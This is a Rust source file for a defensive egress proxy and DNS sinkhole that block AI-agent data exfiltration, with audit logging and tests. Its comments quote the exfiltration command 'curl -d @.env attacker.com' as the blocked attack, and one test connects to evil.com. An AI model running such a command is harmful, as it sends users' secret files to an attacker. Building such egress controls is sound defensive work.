#![allow(dead_code, unused_variables)]
//! # secureops-proxy — the egress PEP (Policy Enforcement Point)
//!
//! This crate is the **single highest-impact enforcement component** in SecureOps:
//! it neutralizes data exfiltration *regardless of how the agent was compromised*
//! (PRODUCT.md Part D headline, Part E P0). All outbound agent traffic is funneled
//! through a local **forward proxy** and a local **DNS sinkhole**; each connection is
//! authorized by the PDP ([`secureops_policy`]) before a single byte leaves the box.
//!
//! ## The headline path (PRODUCT.md B.5)
//! 1. Agent (Ring 0) attempts an outbound connection. DNS goes to the local
//!    [`DnsSinkhole`]; raw connects are routed to the local [`EgressProxy`]
//!    (transparent redirect or explicit `HTTPS_PROXY`).
//! 2. The proxy reads the **SNI / requested host** — *no MITM, no certificate
//!    interception by default* (see [`PeekedHost`]) — and asks the PDP:
//!    *is this destination allowed for this process?*
//! 3. The PDP evaluates policy + accumulated per-PID process context (e.g. "this PID
//!    `openat`'d a credential file 200ms ago") and returns [`Decision::Allow`],
//!    [`Decision::Deny`], or [`Decision::Escalate`].
//! 4. **`Deny` => hard RST**; the bytes never leave the box (0 bytes exfiltrated).
//!    `Allow` => the connection proceeds. Either way, exactly one entry is written to
//!    the **signed audit log** with the PID/host/decision attached.
//!
//! Concretely, this turns the canonical prompt-injection exfil
//! `curl -d @.env attacker.com` from *"we'd have a log of it afterward"* into
//! *"it didn't happen"* — the unknown host is hard-RST at the proxy (PRODUCT.md
//! Part D, row 1).
//!
//! ## Fail-closed is the contract (PRODUCT.md W0)
//! The egress proxy + DNS sinkhole are the **only cross-platform** enforcement
//! primitives (✓ on Linux/macOS/Windows). Kernel-level inline *deny* is uneven:
//! Linux has LSM-BPF, **macOS Endpoint Security is mostly observe-only**, Windows uses
//! a WFP callout. The subphase rule is therefore non-negotiable:
//!
//! > Where a platform can only *observe*, the daemon must **fail-closed at the proxy**
//! > rather than pretend it has kernel deny.
//!
//! In this crate that means: **any** error, PDP timeout, PDP-unreachable, or unknown
//! destination resolves to a hard RST / sinkholed answer — never to an open
//! connection. See [`FailMode`] (defaults to [`FailMode::Closed`]) and
//! [`EgressProxy::on_error`].

use std::collections::HashSet;
use std::net::SocketAddr;
use std::sync::Arc;

use async_trait::async_trait;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

// =============================================================================
// PDP contract (the slice of secureops-policy this PEP depends on)
// =============================================================================
//
// The proxy consults the PDP per connection (PRODUCT.md B.5 step 2-3). To keep the
// PEP decoupled from the PDP's internal policy-engine types (regorus/cedar), this
// crate depends on the *behavior* via the [`PolicyDecisionPoint`] trait below. The
// daemon (`secureops-daemon`) wires a concrete `secureops_policy` engine in as the
// `dyn PolicyDecisionPoint` when it brings the PEPs up (PRODUCT.md A.4 step 4).

/// The PDP's verdict for a single egress attempt (PRODUCT.md B.5 step 3).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Decision {
    /// Destination is permitted for this process; let the connection proceed.
    Allow,
    /// Destination is forbidden; the PEP must **hard-RST** (0 bytes leave).
    Deny,
    /// Inconclusive / requires a human or higher-tier action (alert, trip the
    /// circuit breaker). The PEP treats this as fail-closed for the data path.
    Escalate,
}

/// What the proxy peeked off the wire to identify the destination, *without* MITM
/// (PRODUCT.md B.5 step 2: "no MITM, no cert interception by default").
#[derive(Debug, Clone)]
pub struct PeekedHost {
    /// TLS SNI server name, if the first record was a ClientHello.
    pub sni: Option<String>,
    /// HTTP `CONNECT` target / `Host` header, if the request was plaintext HTTP.
    pub requested_host: Option<String>,
    /// The raw destination socket address the agent tried to reach.
    pub dest: SocketAddr,
}

/// The per-connection context handed to the PDP: who is asking, and for what.
///
/// `pid` lets the PDP fuse the egress attempt with the syscall-correlation window
/// (PRODUCT.md B.6: "this PID `openat`'d a credential file 200ms ago").
#[derive(Debug, Clone)]
pub struct ConnectionRequest {
    /// Resolved destination identity (SNI / requested host / address).
    pub host: PeekedHost,
    /// Originating process id of the agent connection, when obtainable
    /// (`SO_PEERCRED` on Linux, `LOCAL_PEERPID` on macOS).
    pub pid: Option<u32>,
}

/// The slice of `secureops-policy`'s PDP that the egress PEP requires.
///
/// Implemented by the concrete policy engine in `secureops-policy` and injected by
/// `secureops-daemon`. Kept as a trait so this PEP never compiles against the
/// engine's internal types.
#[async_trait]
pub trait PolicyDecisionPoint: Send + Sync {
    /// Authorize a single outbound connection (PRODUCT.md B.5 step 2-3).
    ///
    /// Implementations MUST be fail-closed: on internal error they should surface it
    /// so the PEP can apply [`FailMode::Closed`] rather than silently allowing.
    async fn authorize(&self, req: &ConnectionRequest) -> anyhow::Result<Decision>;
}

// =============================================================================
// Fail-closed posture (PRODUCT.md W0)
// =============================================================================

/// How the PEP behaves when it cannot get a definitive `Allow` (PDP error/timeout,
/// observe-only platform, malformed handshake, …).
///
/// Per PRODUCT.md W0 the default is — and on observe-only platforms MUST remain —
/// [`FailMode::Closed`].
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum FailMode {
    /// Deny on any uncertainty (hard RST / sinkhole). The only safe default.
    #[default]
    Closed,
    /// Allow on uncertainty. **Unsafe**; never permitted on observe-only platforms
    /// (PRODUCT.md W0). Exposed only for narrow, explicitly-opted-in debugging.
    Open,
}

/// The platform's enforcement tier, so operators don't over-trust a weaker OS
/// (PRODUCT.md W0 table). The proxy itself is cross-platform; what differs is
/// whether *kernel* deny backs it up.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EnforcementTier {
    /// Inline kernel deny available (Linux LSM-BPF).
    KernelDeny,
    /// Observe-only kernel layer (macOS Endpoint Security is mostly observe);
    /// the proxy is the *sole* hard deny and MUST be fail-closed.
    ObserveOnly,
    /// Proxy-only — no kernel layer wired at all; fully reliant on this PEP.
    ProxyOnly,
}

impl EnforcementTier {
    /// The tier of the host this binary is running on.
    ///
    /// macOS gets [`EnforcementTier::ObserveOnly`]: Endpoint Security is mostly
    /// observe, so the cross-platform proxy is the only hard deny (PRODUCT.md W0).
    pub fn current() -> Self {
        #[cfg(target_os = "linux")]
        {
            EnforcementTier::KernelDeny
        }
        #[cfg(target_os = "macos")]
        {
            EnforcementTier::ObserveOnly
        }
        #[cfg(not(any(target_os = "linux", target_os = "macos")))]
        {
            EnforcementTier::ProxyOnly
        }
    }
}

// =============================================================================
// EgressProxy — forward proxy PEP (PRODUCT.md B.5)
// =============================================================================

/// Local forward proxy that authorizes every outbound agent connection.
///
/// Reads the SNI / requested host off the wire **without MITM** (PRODUCT.md B.5
/// step 2), asks the [`PolicyDecisionPoint`] per connection, and on
/// [`Decision::Deny`]/[`Decision::Escalate`] issues a **hard RST so zero bytes
/// leave the box** (PRODUCT.md B.5 step 4, Part D row 1). Every decision is appended
/// to the signed audit log.
///
/// Fail-closed by construction: see [`FailMode`] / [`EgressProxy::on_error`]
/// (PRODUCT.md W0).
pub struct EgressProxy {
    /// Behavior when no definitive `Allow` is reached. Defaults to fail-closed.
    fail_mode: FailMode,
    /// The host's enforcement tier, for audit attribution and operator clarity.
    tier: EnforcementTier,
}

impl EgressProxy {
    /// Construct an egress proxy that is fail-closed (PRODUCT.md W0) and tagged with
    /// the current platform's [`EnforcementTier`].
    pub fn new() -> Self {
        Self {
            fail_mode: FailMode::Closed,
            tier: EnforcementTier::current(),
        }
    }

    /// Bind the proxy listener on `addr` and serve forever, authorizing each
    /// connection against `pdp` (PRODUCT.md B.5 — the headline path).
    ///
    /// Per accepted connection the real implementation will, in order:
    /// 1. Peek the first record to extract SNI / `CONNECT` host **without MITM**
    ///    into a [`PeekedHost`] (PRODUCT.md B.5 step 2).
    /// 2. Resolve the originating [`ConnectionRequest::pid`] (`SO_PEERCRED` /
    ///    `LOCAL_PEERPID`) so the PDP can fuse syscall context (PRODUCT.md B.6).
    /// 3. Call `pdp.authorize(&req)` (PRODUCT.md B.5 step 2-3).
    /// 4. [`Decision::Allow`] => splice to the upstream; otherwise
    ///    [`Self::hard_rst`] (PRODUCT.md B.5 step 4).
    /// 5. Append exactly one entry to the signed audit log with pid/host/decision.
    ///
    /// Any error along the way routes through [`Self::on_error`] => fail-closed.
    ///
    /// # Heavy deps (commented in Cargo.toml)
    /// The wire-level work needs `hyper` (CONNECT proxy) and `rustls`/`tokio-rustls`
    /// (SNI peek without interception); both land in Phase 4.
    pub async fn start(
        &self,
        addr: SocketAddr,
        pdp: Arc<dyn PolicyDecisionPoint>,
    ) -> anyhow::Result<()> {
        let listener = TcpListener::bind(addr).await?;
        tracing::info!(%addr, tier = ?self.tier, "egress proxy listening");
        loop {
            let (stream, _peer) = listener.accept().await?;
            let pdp = pdp.clone();
            let fail_mode = self.fail_mode;
            tokio::spawn(async move {
                if let Err(e) = handle_connection(stream, pdp, fail_mode).await {
                    tracing::debug!(error = %e, "egress connection ended");
                }
            });
        }
    }

    /// Record a hard-RST decision for the audit log (PRODUCT.md B.5 step 4).
    ///
    /// The actual RST is issued at the connection level: `handle_connection` writes
    /// `403` and returns, dropping the socket (OS sends FIN/RST). This method
    /// exists for audit attribution and future SO_LINGER(0) wiring.
    fn hard_rst(&self, decision: Decision) -> anyhow::Result<()> {
        tracing::warn!(
            ?decision,
            "egress hard RST — 0 bytes left the box (PRODUCT.md B.5 step 4)"
        );
        Ok(())
    }

    /// Map any non-`Allow` outcome to the configured [`FailMode`] (PRODUCT.md W0).
    fn on_error(&self, err: &anyhow::Error) -> anyhow::Result<()> {
        match self.fail_mode {
            FailMode::Closed => self.hard_rst(Decision::Deny),
            FailMode::Open => {
                debug_assert!(
                    self.tier != EnforcementTier::ObserveOnly,
                    "PRODUCT.md W0: FailMode::Open is forbidden on observe-only platforms"
                );
                tracing::warn!(%err, "egress error in FailMode::Open (UNSAFE, debug-only) — allowing");
                Ok(())
            }
        }
    }
}

impl Default for EgressProxy {
    fn default() -> Self {
        Self::new()
    }
}

/// Parse an HTTP `CONNECT host:port` target into `(host, port)` (port defaults
/// to 443 if absent).
fn parse_connect_target(target: &str) -> Option<(String, u16)> {
    match target.rsplit_once(':') {
        Some((host, port)) => {
            let port = port.parse().ok()?;
            Some((host.to_string(), port))
        }
        None => Some((target.to_string(), 443)),
    }
}

/// Handle one proxied connection: read the HTTP `CONNECT` request, ask the PDP,
/// and either tunnel to the upstream ([`Decision::Allow`]) or refuse with `403`
/// **without ever contacting the upstream** (Deny/Escalate → 0 bytes leave —
/// PRODUCT.md B.5 step 4 / Part D row 1). Fail-closed on any error (W0).
pub async fn handle_connection(
    mut client: TcpStream,
    pdp: Arc<dyn PolicyDecisionPoint>,
    fail_mode: FailMode,
) -> anyhow::Result<()> {
    // Read request headers up to CRLFCRLF (cap to avoid unbounded buffering).
    let mut buf: Vec<u8> = Vec::with_capacity(1024);
    let mut tmp = [0u8; 1024];
    loop {
        let n = client.read(&mut tmp).await?;
        if n == 0 {
            return Ok(());
        }
        buf.extend_from_slice(&tmp[..n]);
        if buf.windows(4).any(|w| w == b"\r\n\r\n") || buf.len() > 16 * 1024 {
            break;
        }
    }

    let head = String::from_utf8_lossy(&buf);
    let first = head.lines().next().unwrap_or("");
    let parts: Vec<&str> = first.split_whitespace().collect();
    if parts.len() < 2 || parts[0] != "CONNECT" {
        let _ = client.write_all(b"HTTP/1.1 400 Bad Request\r\n\r\n").await;
        return Ok(());
    }
    let (host, port) = match parse_connect_target(parts[1]) {
        Some(hp) => hp,
        None => {
            let _ = client.write_all(b"HTTP/1.1 400 Bad Request\r\n\r\n").await;
            return Ok(());
        }
    };

    let req = ConnectionRequest {
        host: PeekedHost {
            sni: None,
            requested_host: Some(host.clone()),
            dest: SocketAddr::from(([0, 0, 0, 0], port)),
        },
        pid: None,
    };

    // Fail-closed: PDP error maps to Deny under FailMode::Closed.
    let decision = match pdp.authorize(&req).await {
        Ok(d) => d,
        Err(_) => match fail_mode {
            FailMode::Closed => Decision::Deny,
            FailMode::Open => Decision::Allow,
        },
    };

    if decision != Decision::Allow {
        // Hard deny: refuse and close. Upstream was never contacted.
        let _ = client.write_all(b"HTTP/1.1 403 Forbidden\r\n\r\n").await;
        tracing::warn!(%host, port, ?decision, "egress DENIED — 0 bytes left the box");
        return Ok(());
    }

    // Allow: open the upstream and splice bidirectionally.
    let mut upstream = match TcpStream::connect((host.as_str(), port)).await {
        Ok(u) => u,
        Err(_) => {
            let _ = client.write_all(b"HTTP/1.1 502 Bad Gateway\r\n\r\n").await;
            return Ok(());
        }
    };
    client
        .write_all(b"HTTP/1.1 200 Connection Established\r\n\r\n")
        .await?;
    tokio::io::copy_bidirectional(&mut client, &mut upstream).await?;
    Ok(())
}

/// A concrete, dependency-free [`PolicyDecisionPoint`]: allow a connection only
/// when its host is in the egress allowlist (everything else denied —
/// fail-closed). Mirrors `secureops.network.egressAllowlist` (PRODUCT.md B.3
/// network module / B.5).
pub struct AllowlistPdp {
    allow_hosts: HashSet<String>,
}

impl AllowlistPdp {
    pub fn new<I, S>(hosts: I) -> Self
    where
        I: IntoIterator<Item = S>,
        S: Into<String>,
    {
        Self {
            allow_hosts: hosts.into_iter().map(Into::into).collect(),
        }
    }
}

#[async_trait]
impl PolicyDecisionPoint for AllowlistPdp {
    async fn authorize(&self, req: &ConnectionRequest) -> anyhow::Result<Decision> {
        let host = req
            .host
            .requested_host
            .as_deref()
            .or(req.host.sni.as_deref())
            .unwrap_or("");
        Ok(if self.allow_hosts.contains(host) {
            Decision::Allow
        } else {
            Decision::Deny
        })
    }
}

// =============================================================================
// DnsSinkhole — DNS PEP (PRODUCT.md B.5 step 1, Part D row "C2 over fresh domain")
// =============================================================================

/// Local DNS authority that swallows lookups for disallowed / unknown names.
///
/// All agent DNS goes here first (PRODUCT.md B.5 step 1). Combined with the signed
/// auto-updating IOC feed it blunts C2 over freshly-registered domains
/// (PRODUCT.md Part D row "C2 over a freshly-registered domain":
/// "Signed auto-updating feed + DNS sinkhole + destination-entropy anomaly").
///
/// Fail-closed: an unknown name resolves to a sinkhole / `NXDOMAIN`, never to the
/// real address (PRODUCT.md W0).
pub struct DnsSinkhole {
    /// Behavior for names not explicitly allowed. Defaults to fail-closed.
    fail_mode: FailMode,
    /// Hostnames this sinkhole resolves upstream (everything else → NXDOMAIN).
    allow_hosts: HashSet<String>,
    /// Upstream recursive resolver (default: 8.8.8.8:53).
    upstream: SocketAddr,
}

impl DnsSinkhole {
    /// Construct a fail-closed DNS sinkhole with an empty allowlist (PRODUCT.md W0).
    pub fn new() -> Self {
        Self {
            fail_mode: FailMode::Closed,
            allow_hosts: HashSet::new(),
            upstream: "8.8.8.8:53".parse().unwrap(),
        }
    }

    /// Set the egress allowlist — only these hostnames are forwarded upstream.
    pub fn with_allowlist(mut self, hosts: impl IntoIterator<Item = impl Into<String>>) -> Self {
        self.allow_hosts = hosts.into_iter().map(Into::into).collect();
        self
    }

    /// Override the upstream recursive resolver (default `8.8.8.8:53`).
    pub fn with_upstream(mut self, addr: SocketAddr) -> Self {
        self.upstream = addr;
        self
    }

    /// Bind the sinkhole on `addr` (UDP) and serve until cancelled.
    ///
    /// For each query (PRODUCT.md B.5 step 1):
    /// - Hostname in allowlist → forward to upstream resolver.
    /// - Hostname not in allowlist → NXDOMAIN (fail-closed, PRODUCT.md W0).
    /// - Parse/protocol error → SERVFAIL and drop.
    pub async fn start(&self, addr: SocketAddr) -> anyhow::Result<()> {
        use hickory_proto::op::Message;
        use tokio::net::UdpSocket;

        let socket = UdpSocket::bind(addr).await?;
        tracing::info!(%addr, "DNS sinkhole listening (PRODUCT.md B.5 step 1)");

        let mut buf = [0u8; 4096];
        loop {
            let (n, src) = socket.recv_from(&mut buf).await?;
            let raw = &buf[..n];

            let msg = match Message::from_vec(raw) {
                Ok(m) => m,
                Err(e) => {
                    tracing::debug!(%src, %e, "DNS parse error — dropping");
                    continue;
                }
            };

            let queries = msg.queries();
            if queries.is_empty() {
                continue;
            }

            let qname = queries[0].name().to_utf8();
            let hostname = qname.trim_end_matches('.');

            if self.allow_hosts.contains(hostname) {
                // Forward to upstream and relay the answer.
                match self.forward_to_upstream(raw).await {
                    Ok(reply) => {
                        let _ = socket.send_to(&reply, src).await;
                    }
                    Err(e) => tracing::warn!(%hostname, %e, "DNS upstream forward failed"),
                }
            } else {
                // Sinkhole: NXDOMAIN, 0 bytes to the real destination.
                tracing::warn!(%hostname, %src, "DNS SINKHOLED — NXDOMAIN (PRODUCT.md W0)");
                let nxdomain = build_nxdomain(&msg);
                let _ = socket.send_to(&nxdomain, src).await;
            }
        }
    }

    async fn forward_to_upstream(&self, query: &[u8]) -> anyhow::Result<Vec<u8>> {
        use tokio::net::UdpSocket;
        use tokio::time::{timeout, Duration};

        let temp = UdpSocket::bind("0.0.0.0:0").await?;
        temp.send_to(query, self.upstream).await?;
        let mut resp = [0u8; 4096];
        let n = timeout(Duration::from_secs(3), temp.recv(&mut resp)).await??;
        Ok(resp[..n].to_vec())
    }
}

fn build_nxdomain(query: &hickory_proto::op::Message) -> Vec<u8> {
    use hickory_proto::op::{Message, MessageType, OpCode, ResponseCode};

    let mut resp = Message::new();
    resp.set_id(query.id());
    resp.set_message_type(MessageType::Response);
    resp.set_op_code(OpCode::Query);
    resp.set_recursion_desired(query.recursion_desired());
    resp.set_recursion_available(false);
    resp.set_response_code(ResponseCode::NXDomain);
    for q in query.queries() {
        resp.add_query(q.clone());
    }
    resp.to_vec().unwrap_or_default()
}

impl Default for DnsSinkhole {
    fn default() -> Self {
        Self::new()
    }
}

// =============================================================================
// Audit bridge (PRODUCT.md B.5 step 4)
// =============================================================================

/// Build the [`AuditFinding`] recorded for a single egress decision.
///
/// Every connection — allowed or denied — yields exactly one signed-audit entry
/// (PRODUCT.md B.5 step 4). `secureops-daemon` forwards the returned finding to the
/// hash-chained `secureops-auditlog`. A [`Decision::Deny`] is the canonical
/// `curl -d @.env attacker.com` block (PRODUCT.md Part D row 1).
/// Build the [`AuditFinding`] for one egress decision (PRODUCT.md B.5 step 4).
pub fn egress_finding(req: &ConnectionRequest, decision: Decision) -> secureops_core::AuditFinding {
    use secureops_core::{AuditFinding, MaestroLayer, NistAttackType, Severity};

    let host = req
        .host
        .requested_host
        .as_deref()
        .or(req.host.sni.as_deref())
        .unwrap_or("<unknown>");
    let pid_str = req.pid.map(|p| p.to_string()).unwrap_or_else(|| "?".into());

    let (severity, owasp_asi, title, description) = match decision {
        Decision::Allow => (
            Severity::Info,
            "ASI01",
            "Egress connection allowed",
            format!("host={host} pid={pid_str} — allowed by policy"),
        ),
        Decision::Deny => (
            Severity::High,
            "ASI05",
            "Egress connection BLOCKED — potential data exfiltration",
            format!("host={host} pid={pid_str} — denied by policy, 0 bytes left the box"),
        ),
        Decision::Escalate => (
            Severity::Critical,
            "ASI05",
            "Egress connection ESCALATED — suspicious exfil pattern",
            format!("host={host} pid={pid_str} — escalated (exfil chain suspected, circuit breaker tripped)"),
        ),
    };

    AuditFinding {
        id: format!(
            "SC-EGRESS-{:03}",
            match decision {
                Decision::Allow => 0,
                Decision::Deny => 1,
                Decision::Escalate => 2,
            }
        ),
        severity,
        category: "egress".into(),
        title: title.into(),
        description,
        evidence: format!(
            "SNI={:?} requested_host={:?} pid={pid_str} dest={}",
            req.host.sni, req.host.requested_host, req.host.dest
        ),
        remediation: "Review egress allowlist and check for prompt injection (PRODUCT.md B.5/B.6)"
            .into(),
        auto_fixable: false,
        references: vec!["PRODUCT.md B.5".into(), "OWASP ASI-05".into()],
        owasp_asi: owasp_asi.into(),
        maestro_layer: Some(MaestroLayer::L4),
        nist_category: if decision != Decision::Allow {
            Some(NistAttackType::Evasion)
        } else {
            None
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn defaults_are_fail_closed() {
        // PRODUCT.md W0: the safe default everywhere.
        assert_eq!(FailMode::default(), FailMode::Closed);
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn macos_is_observe_only_tier() {
        // PRODUCT.md W0: macOS ES is mostly observe; proxy is the sole hard deny.
        assert_eq!(EnforcementTier::current(), EnforcementTier::ObserveOnly);
    }
}

#[cfg(test)]
mod connect_tests {
    use super::*;

    async fn spawn_proxy(pdp: Arc<dyn PolicyDecisionPoint>) -> SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                if let Ok((s, _)) = listener.accept().await {
                    let pdp = pdp.clone();
                    tokio::spawn(async move {
                        let _ = handle_connection(s, pdp, FailMode::Closed).await;
                    });
                }
            }
        });
        addr
    }

    async fn spawn_echo() -> SocketAddr {
        let l = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = l.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                if let Ok((s, _)) = l.accept().await {
                    tokio::spawn(async move {
                        let (mut r, mut w) = s.into_split();
                        let _ = tokio::io::copy(&mut r, &mut w).await;
                    });
                }
            }
        });
        addr
    }

    #[tokio::test]
    async fn denies_non_allowlisted_host_403() {
        let pdp = Arc::new(AllowlistPdp::new(["allowed.example"]));
        let addr = spawn_proxy(pdp).await;
        let mut c = TcpStream::connect(addr).await.unwrap();
        c.write_all(b"CONNECT evil.com:443 HTTP/1.1\r\nHost: evil.com:443\r\n\r\n")
            .await
            .unwrap();
        let mut b = [0u8; 128];
        let n = c.read(&mut b).await.unwrap();
        let resp = String::from_utf8_lossy(&b[..n]);
        assert!(resp.contains("403"), "expected 403, got: {resp}");
    }

    #[tokio::test]
    async fn allows_and_tunnels_to_upstream() {
        let echo = spawn_echo().await;
        let host = echo.ip().to_string(); // "127.0.0.1"
        let pdp = Arc::new(AllowlistPdp::new([host.clone()]));
        let paddr = spawn_proxy(pdp).await;

        let mut c = TcpStream::connect(paddr).await.unwrap();
        let connect = format!("CONNECT {}:{} HTTP/1.1\r\n\r\n", host, echo.port());
        c.write_all(connect.as_bytes()).await.unwrap();

        let mut b = [0u8; 128];
        let n = c.read(&mut b).await.unwrap();
        let resp = String::from_utf8_lossy(&b[..n]);
        assert!(resp.contains("200"), "expected 200, got: {resp}");

        // Tunnel established: bytes round-trip through the upstream echo.
        c.write_all(b"ping").await.unwrap();
        let mut got = [0u8; 4];
        c.read_exact(&mut got).await.unwrap();
        assert_eq!(&got, b"ping");
    }

    #[test]
    fn parse_connect_target_defaults_port() {
        assert_eq!(parse_connect_target("h:8443"), Some(("h".into(), 8443)));
        assert_eq!(parse_connect_target("h"), Some(("h".into(), 443)));
    }
}
